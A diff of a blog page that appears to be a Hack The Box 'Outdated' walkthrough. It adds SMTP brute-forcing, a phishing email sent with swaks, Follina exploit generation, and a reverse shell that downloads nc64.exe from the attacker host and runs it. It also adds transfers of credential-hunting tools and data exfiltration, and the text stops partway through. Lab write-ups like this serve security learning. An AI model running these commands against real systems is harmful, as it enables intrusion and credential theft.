@@ -328,16 +328,6 @@
         
             
                 <li class="file">
-                    <a href="http://localhost:1313/shadowcredentialsattack/" title="./shadowcredentialsattack/">
-                        
-                            Understanding the Shadow Credentials Attack Vector
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
                     <a href="http://localhost:1313/outdated-box/" title="./outdated-box/">
                         
                             Outdated HTB Walkthrough
@@ -400,8 +390,8 @@
                     <div class="date" title="Date">
                         <i class="bi bi-calendar3"></i>
                         <time
-                            datetime="2024.10.10"
-                            >2024.10.10
+                            datetime="2024.13.10"
+                            >2024.13.10
                         </time>
                     </div>
                 
@@ -411,7 +401,7 @@
                         class="readtime"
                         title="Time to Read">
                         <i class="bi bi-clock"></i>
-                        12 mins to read
+                        25 mins to read
                     </div>
                 
             </div>
@@ -439,9 +429,9 @@
                         </a>
                     
                         <a
-                            href="/tags/easy/"
+                            href="/tags/medium/"
                             class="tag-btn">
-                            Easy
+                            Medium
                         </a>
                     
                         <a
@@ -451,9 +441,63 @@
                         </a>
                     
                         <a
-                            href="/tags/ldap/"
+                            href="/tags/active-directory/"
                             class="tag-btn">
-                            LDAP
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/wsus/"
+                            class="tag-btn">
+                            WSUS
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberos/"
+                            class="tag-btn">
+                            Kerberos
+                        </a>
+                    
+                        <a
+                            href="/tags/follina/"
+                            class="tag-btn">
+                            Follina
+                        </a>
+                    
+                        <a
+                            href="/tags/ad/"
+                            class="tag-btn">
+                            AD
+                        </a>
+                    
+                        <a
+                            href="/tags/rubeus/"
+                            class="tag-btn">
+                            Rubeus
+                        </a>
+                    
+                        <a
+                            href="/tags/whisker/"
+                            class="tag-btn">
+                            Whisker
+                        </a>
+                    
+                        <a
+                            href="/tags/shadow/"
+                            class="tag-btn">
+                            Shadow
+                        </a>
+                    
+                        <a
+                            href="/tags/credentials/"
+                            class="tag-btn">
+                            Credentials
+                        </a>
+                    
+                        <a
+                            href="/tags/msds-keycredentiallink/"
+                            class="tag-btn">
+                            msDS-KeyCredentialLink
                         </a>
                     
                 </div>
@@ -515,18 +559,47 @@
         <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
         <li><a href="#smtp-25">SMTP <code>25</code>:</a></li>
         <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#logging-into-the-shares-to-find-a-pdf">Logging into the <code>Shares</code> to find a <code>PDF</code>:</a></li>
+        <li><a href="#attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</a></li>
+        <li><a href="#reading-noc-reminder-dot-pdf-and-discovering-exploits-that-the-environment-is-susceptible-to">Reading <code>NOC_Reminder.pdf</code> and discovering exploits that the environment is susceptible to:</a></li>
+        <li><a href="#investigating-the-cve-list-for-an-attack-path">Investigating the CVE list For an attack path:</a></li>
       </ul>
     </li>
-    <li><a href="#use-folina-send-via-smtp-to-the-two-email-addresses-we-have-found"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> Use Folina Send via SMTP to the two email addresses we have found</a>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
       <ul>
-        <li><a href="#8531">?? <code>8531</code>:</a></li>
+        <li><a href="#quick-overview-on-follina-exploit">Quick overview on Follina Exploit:</a></li>
+        <li><a href="#testing-if-we-can-make-itsupport-click-an-emailed-link-using-swaks">Testing if we can make <code>itsupport</code> click an emailed link using <code>swaks</code>:</a></li>
+        <li><a href="#trying-to-get-a-reverse-shell-using-the-follina-exploit">Trying to get a reverse shell using the <code>Follina</code> exploit:</a></li>
+        <li><a href="#getting-a-reverse-shell-using-follina-dot-py">Getting a Reverse shell using <code>Follina.py</code>:</a></li>
+        <li><a href="#enumerating-as-the-user-btables">Enumerating as the user <code>btables</code>:</a></li>
+        <li><a href="#using-sharphound-dot-exe-to-enumerate-the-environment-dot">Using <code>SharpHound.exe</code> to enumerate the environment.</a></li>
+        <li><a href="#transferring-the-sharphound-zip-back-to-myself-using-my-custom-python-webserver">Transferring the <code>SharpHound</code> Zip back to myself using my custom python webserver:</a></li>
       </ul>
     </li>
-    <li><a href="#use-cve-list-to-attack"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> use CVE list to attack:</a></li>
-    <li><a href="#2-dot-foothold">2. Foothold:</a></li>
-    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a></li>
-    <li><a href="#4-dot-ownership">4. Ownership:</a></li>
-    <li><a href="#5-dot-persistence">5. Persistence:</a></li>
+    <li><a href="#3-dot-lateral-movement">3. Lateral Movement:</a>
+      <ul>
+        <li><a href="#discovering-btables-has-addkeycredentiallink-privilege-over-sflowers">Discovering <code>btables</code> has <code>AddKeyCredentialLink</code> privilege over <code>sflowers</code>:</a></li>
+        <li><a href="#building-whisker-dot-exe">Building <code>whisker.exe</code>:</a></li>
+        <li><a href="#adding-shadow-credentials-to-sflowers-using-whisker-dot-exe">Adding Shadow Credentials to <code>sflowers</code> using <code>whisker.exe</code> :</a></li>
+        <li><a href="#i-use-the-base64-encoded-certificate-to-request-a-tgt-for-sflowers-using-rubeus">I use the base64 encoded certificate to request a <code>TGT</code> for <code>sflowers</code> using rubeus:</a></li>
+        <li><a href="#enumerating-the-host-as-slfowers">Enumerating the Host as <code>slfowers</code>:</a></li>
+        <li><a href="#seeing-sflowers-has-outbound-object-control-over-the-ca">Seeing <code>sflowers</code> has outbound object control over the <code>CA</code>:</a></li>
+        <li><a href="#discovering-sflowers-is-part-of-the-wsus-administrators-group">Discovering <code>sflowers</code> is part of the wsus administrators group:</a></li>
+        <li><a href="#what-is-wsus--windows-server-update-services">What is <code>WSUS</code> (Windows Server Update Services)?</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-privilege-escalation">4. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#manually-enumerating-the-wsus-service-by-querying-the-registry">Manually Enumerating the <code>WSUS</code> Service by querying the registry:</a></li>
+        <li><a href="#using-sharpwsus-to-push-a-malicious-update">Using <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a> to push a malicious update:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-persistence">4. Persistence:</a>
+      <ul>
+        <li><a href="#creating-a-golden-ticket-with-mimikatz-dot-exe">Creating a golden ticket with <code>mimikatz.exe</code>:</a></li>
+        <li><a href="#dumping-ntds-for-fun-for-fun-and-profit">Dumping NTDS for fun for fun and profit:</a></li>
+      </ul>
+    </li>
     <li><a href="#lessons-learned">Lessons Learned:</a>
       <ul>
         <li><a href="#what-did-i-learn">What did I learn?</a></li>
@@ -534,12 +607,6 @@
       </ul>
     </li>
     <li><a href="#sign-off">Sign off:</a></li>
-    <li><a href="#9c69d6"><del>CREDS</del>:</a>
-      <ul>
-        <li><a href="#ssh-keys">SSH Keys:</a></li>
-        <li><a href="#compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</a></li>
-      </ul>
-    </li>
   </ul>
 </nav>
         
@@ -747,27 +814,6 @@
 </ul>
 </li>
 </ul>
-<!-- raw HTML omitted -->
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div>
-    
-</div>
 </li>
 </ul>
 <h3 id="ldap-389">LDAP <code>389</code>:</h3>
@@ -871,7 +917,7 @@
 <li>The functionality level determines the minimum version of Windows server that can be used for a DC.
 <ul>
 <li>
-<p><del>Note</del>: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
 </li>
 <li>
 <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
@@ -935,7 +981,7 @@
   </tbody>
 </table>
 <ul>
-<li><del>Note</del>:
+<li>+Note+:
 <ul>
 <li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
 <li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
@@ -983,9 +1029,6 @@
 <li>We have the naming context.</li>
 <li>Domain name.</li>
 </ul>
-</li>
-<li>
-<p><del>Note</del>: I was wrong I thought this would be the route forward, maybe it&rsquo;s kerberos…</p>
 </li>
 <li>
 <p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
@@ -1042,7 +1085,7 @@
 </figure>
 </li>
 <li>As we can see we do have the option <code>AUTH LOGIN</code>, so this may be useful for later if we need to send anything.</li>
-<li><del>Note</del>: Remember you can only send mail via <code>SMTP</code> on the CLI not read. We need <code>IMAP</code> or <code>POP3</code> to read.</li>
+<li>+Note+: Remember you can only send mail via <code>SMTP</code> on the CLI not read. We need <code>IMAP</code> or <code>POP3</code> to read.</li>
 </ul>
 <h4 id="smtp-commands--via-telnet">SMTP Commands (via Telnet):</h4>
 <ul>
@@ -1083,6 +1126,25 @@
 </ul>
 </li>
 </ul>
+<h4 id="attempting-to-bruteforce-smtp">Attempting to bruteforce SMTP:</h4>
+<h5 id="using-hydra-to-bruteforce-smtp">Using Hydra to bruteforce SMTP:</h5>
+<ul>
+<li><code>hydra -l itsupport -P +/Wordlists/rockyou.txt $box smtp -t 1</code></li>
+<li>I try hydra however no matter how many threads I set it always disables due to too many connections.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-135511_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="i-try-the-smtp-nmap-bruteforcing-dot-nse-script">I try the SMTP NMAP bruteforcing <code>.nse</code> script:</h5>
+<ul>
+<li><code>nmap -p 25 --script smtp-brute $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-10-135635_.png">
+</figure>
+</li>
+</ul>
 <h3 id="smb-445">SMB <code>445</code>:</h3>
 <h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
 <ul>
@@ -1110,7 +1172,7 @@
 </ul>
 </li>
 </ul>
-<h4 id="logging-into-the-shares-to-find-a-pdf">Logging into the <code>Shares</code> to find a <code>PDF</code>:</h4>
+<h3 id="logging-into-the-shares-to-find-a-pdf">Logging into the <code>Shares</code> to find a <code>PDF</code>:</h3>
 <ul>
 <li>
 <p><strong>I login to the SMB share using the guest account &amp; immediatley find a</strong> <code>pdf</code>:</p>
@@ -1130,7 +1192,7 @@
 </ul>
 </li>
 </ul>
-<h4 id="attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</h4>
+<h3 id="attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</h3>
 <p>If you are not aware, it is sometimes possible to extract valid domain usernames from <code>pdf's</code> if they have been created on a Windows host. As often the Creator Field is populated using the Windows User&rsquo;s Logged-In Name</p>
 <ul>
 <li><strong>Some reasons why the Creator Field Uses the Windows User&rsquo;s Logged-In Name</strong>:
@@ -1217,39 +1279,23 @@
 </ol>
 </li>
 </ul>
-<h4 id="reading-noc-reminder-dot-pdf-and-discovering-exploits-that-the-environment-is-susceptible-to">Reading <code>NOC_Reminder.pdf</code> and discovering exploits that the environment is susceptible to:</h4>
+<h3 id="reading-noc-reminder-dot-pdf-and-discovering-exploits-that-the-environment-is-susceptible-to">Reading <code>NOC_Reminder.pdf</code> and discovering exploits that the environment is susceptible to:</h3>
 <ul>
 <li>Looking at the PDF it provides a list of vulnerabilities in the environment that they need to patch as well as corresponding CVE&rsquo;s.
 <ul>
 <li><figure><img src="/ox-hugo/2024-10-10-092144_.png">
 </figure>
 </li>
-<li>It also reveals another email address: <code>itsupport@outdated.htb</code></li>
-<li><figure><img src="/ox-hugo/2024-10-10-092155_.png">
+<li>It also reveals another email address: <code>itsupport@outdated.htb</code> is expecting to be sent links to internal web applications to them.</li>
+<li><figure><img src="/ox-hugo/2024-10-10-143233_.png">
 </figure>
 </li>
 </ul>
 </li>
 </ul>
-<h4 id="investigating-the-cve-list-for-an-attack-path">Investigating the CVE list For an attack path:</h4>
+<h3 id="investigating-the-cve-list-for-an-attack-path">Investigating the CVE list For an attack path:</h3>
 <ul>
 <li><strong>I will use these CVE&rsquo;s as a starting point to see if we can find an easy way in.</strong></li>
-</ul>
-<h5 id="cve-2022-30190--remote">CVE-2022-30190 (Remote):</h5>
-<ul>
-<li>This is the follina exploit. There is a great writeup here by HTB. It is a microsoft word exploit.
-<ul>
-<li><a href="https://www.hackthebox.com/blog/cve-2022-30190-follina-explained">https://www.hackthebox.com/blog/cve-2022-30190-follina-explained</a></li>
-<li>John Hammond also has a great video here 
-
-    
-    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/dGCOhORNKRk?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
-      ></iframe>
-    </div>
-</li>
-</ul>
-</li>
 </ul>
 <h5 id="cve-2022-30138-printspooler-privilege-escalation">CVE-2022-30138 PrintSpooler Privilege Escalation:</h5>
 <ul>
@@ -1267,146 +1313,1004 @@
 <ul>
 <li>Microsoft Windows: CVE-2022-29130: Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.</li>
 </ul>
-<h2 id="use-folina-send-via-smtp-to-the-two-email-addresses-we-have-found"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> Use Folina Send via SMTP to the two email addresses we have found</h2>
-<h3 id="8531">?? <code>8531</code>:</h3>
-<h2 id="use-cve-list-to-attack"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> use CVE list to attack:</h2>
+<h5 id="cve-2022-30190-follina-exploit">CVE-2022-30190 Follina Exploit:</h5>
+<ul>
+<li>This is the follina exploit, it is a microsoft word exploit.
+<ul>
+<li>There is a great writeup here by HTB.
+<ul>
+<li><a href="https://www.hackthebox.com/blog/cve-2022-30190-follina-explained">https://www.hackthebox.com/blog/cve-2022-30190-follina-explained</a></li>
+</ul>
+</li>
+<li>John Hammond also has a great video here {{&lt; youtube dGCOhORNKRk &gt;}}</li>
+</ul>
+</li>
+</ul>
 <h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="quick-overview-on-follina-exploit">Quick overview on Follina Exploit:</h3>
+<ul>
+<li>We craft a malicious Office documents that uses a feature to load remote <code>HTML</code> via a link. This triggers <code>Microsoft Support Diagnostic Tool MSDT</code> (overview below), allowing us to execute arbitrary code on the victim&rsquo;s machine without the need for macros.</li>
+<li>+This is the crazy part+
+<ul>
+<li>All that needs to happen for exploitation is that the user opens or +previews+ (if <code>.rtf</code> is used) the office document.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Attack Path</strong>
+<ul>
+<li>This may be valid attack path as we know that <code>itsupport</code> is expecting to be sent links.</li>
+</ul>
+</li>
+</ul>
+<h5 id="microsoft-support-diagnostic-tool--msdt--overview">Microsoft Support Diagnostic Tool (MSDT) Overview:</h5>
+<ul>
+<li>
+<p><strong>Purpose</strong>:</p>
+<ul>
+<li><code>MSDT</code> is a built-in Windows tool designed to help users troubleshoot and diagnose system problems.</li>
+<li>It collects diagnostic information (logs, configurations, etc.) about a system and sends it to Microsoft Support or can be used to automatically resolve issues based on predefined fixes.</li>
+</ul>
+</li>
+<li>
+<p><strong>Functionality</strong>:</p>
+<ul>
+<li>It works through various troubleshooting packs, which are scripts or tools that identify and resolve specific issues (e.g., network connectivity, hardware problems).</li>
+<li>Often accessed via Windows troubleshooting settings or invoked by support agents when collecting system data remotely.</li>
+</ul>
+</li>
+<li>
+<p><strong>How it’s triggered</strong>:</p>
+<ul>
+<li>Can be invoked manually by users or automatically through specific command-line arguments.</li>
+<li>In the case of the Follina exploit, it was invoked through a URL protocol (e.g., <code>ms-msdt:</code>) embedded in a malicious Office document.</li>
+</ul>
+</li>
+</ul>
+<h3 id="testing-if-we-can-make-itsupport-click-an-emailed-link-using-swaks">Testing if we can make <code>itsupport</code> click an emailed link using <code>swaks</code>:</h3>
+<ul>
+<li>
+<p><strong>I use swaks to send an email to the</strong> <code>itsupport@outdated.htb</code>:</p>
+<ul>
+<li><code>swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body &quot;http://10.10.14.43/&quot; --header &quot;Subject: Testing&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-10-150005_.png">
+</figure>
+</li>
+<li>I put the IP of my attack box as a link within the body and setup a listener on host.
+<ul>
+<li><code>nc -nvlp 80</code></li>
+</ul>
+</li>
+<li>I do this as I want to see if we send a link will it be clicked.</li>
+</ul>
+</li>
+<li>
+<p><strong>I get a connection back to my listener once the email is sent</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-145936_.png">
+</figure>
+</li>
+<li>This verified that if a link is sent to that email address the link will be clicked.</li>
+</ul>
+</li>
+</ul>
+<h3 id="trying-to-get-a-reverse-shell-using-the-follina-exploit">Trying to get a reverse shell using the <code>Follina</code> exploit:</h3>
+<ul>
+<li>This section includes all my troubleshooting when I couldn&rsquo;t get things started/moving forward. I want to leave this in as a lot of walkthroughs&rsquo; are like, so I did A, B, C and that&rsquo;s how I got root. Where as it&rsquo;s never that simple, for me at least, and leads to unrealistic expectations for people just trying to get into the industry/CTF&rsquo;s. So I leave almost everything in, bones and all.</li>
+</ul>
+<h4 id="trying-to-get-a-reverse-shell-using-follina-and-a-malicious-dot-doc">Trying to get a reverse shell using <code>Follina</code> and a malicious <code>.doc</code>:</h4>
+<ul>
+<li>
+<p><strong>I download john-hammonds follina POC</strong>:</p>
+<ul>
+<li><a href="https://github.com/JohnHammond/msdt-follina?tab=readme-ov-file">https://github.com/JohnHammond/msdt-follina?tab=readme-ov-file</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Create a base64 encoded reverse shell using</strong> <a href="https://revshells.com">https://revshells.com</a>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-155640_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Run the exploit generator &amp; passing in my base64 encoded string</strong>:</p>
+<ul>
+<li><code>python3 follina.py -i tun0 -p 9999  -c &quot;powershell -e &lt;base64EncodedString&gt;&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-10-155503_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>The exploit by default starts the listener too to serve the malicious</strong> <code>.html</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-155708_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I start my listener on</strong> <code>443</code>:</p>
+<ul>
+<li><code>nc -nvlp 443</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I use swaks to send the malicious document</strong>:</p>
+<ul>
+<li><code>swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body &quot;http://10.10.14.43/&quot; --header &quot;Subject: Testing&quot; --attach follina.doc</code></li>
+<li><figure><img src="/ox-hugo/2024-10-10-155753_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>And I get…..nothing</strong>:</p>
+<ul>
+<li>Lets get thinking…..</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-get-a-reverse-shell-using-follina-malicious-html">Trying to get a reverse shell using <code>Follina</code> malicious <code>html</code>:</h4>
+<ul>
+<li>With the <code>Follina</code> exploit the <code>.doc/.rtf</code> is just a mechanism to have the victim reach out to the malicious <code>html</code> which actually has the payload. As we know that if we send a link to the <code>itsupport</code> it will be clicked. Which means we should be able to send them a direct link to the malicious <code>follina</code> <code>html</code>, it be clicked and the payload delivered.</li>
+</ul>
+<h5 id="using-john-hammond-s-follina-exploit-web-server-to-serve-the-payload">Using John Hammond&rsquo;s <code>Follina</code> exploit web-server to serve the payload:</h5>
+<ul>
+<li>
+<p><strong>I double check that the html is working by running curl</strong>:</p>
+<ul>
+<li><code>curl http://10.10.14.43:9999</code></li>
+<li>We can see it is here so we know it is running:</li>
+<li><figure><img src="/ox-hugo/2024-10-10-160414_.png">
+</figure>
+
+<ul>
+<li>If you&rsquo;re wondering why it&rsquo;s so much data, the exploit requires 4096 bytes of padding to be included before the exploit will trigger.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Checking the server we can see the request</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-160601_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I put the</strong> <code>nc64.exe</code> <strong>in the same folder and modify my command</strong>:</p>
+<ul>
+<li><code>python3 follina.py -i tun0 -p 9999  -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\Windows\Temp\nc64.exe; C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.43 443</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-071239_.png">
+</figure>
+</li>
+<li>What&rsquo;s strange is I can get it trigger the part where it reaches out to the webserver, but it never actually pulls down the <code>nc64.exe</code> binary however, it just reaches out to the server.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Back to the drawing board….</strong>
+<ul>
+<li>I mean I could debug this but there are other publicly available exploits so will try one of them first.</li>
+</ul>
+</li>
+</ul>
+<h3 id="getting-a-reverse-shell-using-follina-dot-py">Getting a Reverse shell using <code>Follina.py</code>:</h3>
+<ul>
+<li>
+<p><strong>I find this exploit</strong>:</p>
+<ul>
+<li><a href="https://github.com/chvancooten/follina.py">https://github.com/chvancooten/follina.py</a></li>
+</ul>
+</li>
+<li>
+<p><strong>I copy the</strong> <code>nc64.exe</code> <strong>binary to it&rsquo;s root web folder</strong> <code>/www</code>:</p>
+</li>
+<li>
+<p><strong>Start the webserver &amp; put my command I want to run when the victim reaches the malicious</strong> <code>html</code>:</p>
+<ul>
+<li><code>python follina.py -t rtf -m command -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\Windows\\Temp\\nc64.exe; C:\\Windows\\Temp\\nc64.exe -e cmd.exe 10.10.14.43 443'</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-074938_.png">
+</figure>
+</li>
+<li>+Note+: With this particular exploit the author does to use double backslashes to escape them.</li>
+</ul>
+</li>
+<li>
+<p><strong>Send my email via</strong> <code>swaks</code>:</p>
+<ul>
+<li><code>swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body &quot;Here is the web app - http://10.10.14.43/exploit.html&quot; --header &quot;Subject: Web&quot;</code></li>
+</ul>
+</li>
+<li>
+<p><strong>We immediately get a hit on the web server</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-075043_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We catch our shell Caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-075203_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-the-user-btables">Enumerating as the user <code>btables</code>:</h3>
+<h4 id="checking-if-printspoofer-is-a-viable-exploit-path">Checking if <code>PrintSpoofer</code> is a viable exploit path:</h4>
+<ul>
+<li>
+<p><strong>As we saw that</strong> <code>PrintSpooler/PrintSpoofer</code> <strong>was mentioned the first thing to check is the privileges of our user</strong>:</p>
+<ul>
+<li>To perform this attack we need either <code>SeAssignPrimaryTokenPrivilege</code> or <code>SeImpersonatePrivilege</code> we have neither.</li>
+<li><figure><img src="/ox-hugo/2024-10-11-101536_.png">
+</figure>
+</li>
+<li>Maybe we can activate them with <a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77">EnableAllTokePrivs.ps1</a></li>
+</ul>
+</li>
+<li>
+<p><strong>I transer</strong> <a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77">EnableAllTokePrivs.ps1</a>:</p>
+<ul>
+<li><code>powershell -c wget http://10.10.14.43:9000/EnableAllTokenPrivs.ps1 -o tp.ps1</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-101954_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I run it</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-102126_.png">
+</figure>
+</li>
+<li>No luck:</li>
+<li><figure><img src="/ox-hugo/2024-10-11-102149_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-a-check-mail-dot-ps1-script-containing-clear-text-creds">Finding a <code>check_mail.ps1</code> script containing clear text creds:</h4>
+<ul>
+<li>
+<p><strong>I discover a script called</strong> <code>check_mail.ps1</code> <strong>in the users home folder</strong>::</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-183411_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Reading the contents of the script reveals a new username and a clear-text password</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-10-190326_.png">
+</figure>
+</li>
+<li>I add the username and password to my list:</li>
+</ul>
+</li>
+<li>
+<p><strong>I check if the username &amp; password can be used to access SMB or LDAP but they cannot</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-094845_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="reading-emails-using-check-mail-dot-ps1">Reading Emails using <code>check_mail.ps1</code>:</h4>
+<ul>
+<li><strong>I run the</strong> <code>check_mail.ps1</code> <strong>script</strong>:
+<ul>
+<li><code>powershell -c .\.check_mail.ps1</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-095038_.png">
+</figure>
+</li>
+<li>I have a feeling this is just the automated mechanism to read the email we sent.</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-extract-credentials-using-lazagne-dot-exe">Trying to Extract Credentials using <a href="https://github.com/AlessandroZ/LaZagne">LaZagne.exe</a>:</h4>
+<ul>
+<li><strong>I transer</strong> <code>LaZagne.exe</code> <strong>over to hunt for passwords</strong>:
+<ul>
+<li><code>curl http://10.10.14.43:9000/LaZagne.exe -o lz.exe</code></li>
+<li>I get a big fat nothing:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-095943_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-sharphound-dot-exe-to-enumerate-the-environment-dot">Using <code>SharpHound.exe</code> to enumerate the environment.</h3>
+<ul>
+<li>
+<p><strong>I transfer the binary accross</strong>:</p>
+<ul>
+<li><code>powershell -c wget http://10.10.14.43:9000/SharpHound.exe -o sh.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-102411_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I run the collector</strong>:</p>
+<ul>
+<li><code>.\sh.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-102440_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="transferring-the-sharphound-zip-back-to-myself-using-my-custom-python-webserver">Transferring the <code>SharpHound</code> Zip back to myself using my custom python webserver:</h3>
 <ol>
-<li></li>
+<li>
+<p><strong>Start my custom python webserver</strong>:</p>
+<ul>
+<li>I have this handy python webserver that is useful when exfiling data.
+<ul>
+<li>You can find it here: <a href="https://github.com/bloodstiller/bloodserver">https://github.com/bloodstiller/bloodserver</a></li>
+<li>Save as <code>bloodserver.py</code></li>
+<li>Run <code>python3 bloodserver.py -u bloodstiller --password bl00dst1ll3r -p 9999 --https</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-114129_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>+NOTE+:
+<ul>
+<li>Will output file as <code>uploaded_file</code></li>
+<li>FYI my server has certs and you can enter in passwords &amp; usernames or it will auto-generate one for you.</li>
+<li>The only reason I am not using <code>443</code> for https is because my revers-shell is running over that.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Send the file from victim using</strong> <code>powershell</code>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
